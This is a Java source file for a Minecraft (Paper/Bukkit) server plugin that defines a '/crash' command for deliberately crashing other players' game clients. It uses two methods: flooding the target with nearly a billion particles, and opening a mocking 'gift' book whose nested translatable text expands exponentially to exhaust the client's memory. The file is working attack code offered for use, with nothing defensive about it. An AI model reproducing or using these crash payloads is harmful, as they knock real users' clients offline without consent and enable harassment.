package eu.koolfreedom.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import eu.koolfreedom.command.annotation.CommandParameters;
import eu.koolfreedom.command.KoolCommand;
import io.papermc.paper.command.brigadier.CommandSourceStack;
import io.papermc.paper.command.brigadier.argument.ArgumentTypes;
import net.kyori.adventure.inventory.Book;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.List;

@CommandParameters(name = "crash", description = "Crash people's clients.", usage = "/<command> [player]",
        aliases = {"370"})
public class CrashCommand extends KoolCommand
{
    @Override
    public void build(LiteralArgumentBuilder<CommandSourceStack> root)
    {
        root.then(argument("target", ArgumentTypes.player())
                .then(literal("particles").executes(executes(ctx -> crashParticles(player(ctx, "target")))))
                .then(literal("jvm_oom").executes(executes(ctx -> crashJVM(player(ctx, "target"), sender(ctx))))));
    }

    private void crashParticles(Player target)
    {
        target.spawnParticle(Particle.ASH, target.getLocation(), 999999999);
        msg(target, "<green>:)");
    }

    private void crashJVM(Player target, CommandSender sender)
    {
        target.openBook(Book.builder()
                .author(Component.text(sender.getName()))
                .title(Component.text("A loving gift").color(NamedTextColor.LIGHT_PURPLE))
                .pages(decimatorComponent())
                .build());
        msg(sender, "<green>Your wish is my command.");
    }

    private Component decimatorComponent()
    {
        Component c = Component.text("meowmeowmeowmeowmeowmeowmeowmeow");
        for (int i = 0; i < 20; i++)
        {
            c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);
        }
        return c;
    }
}
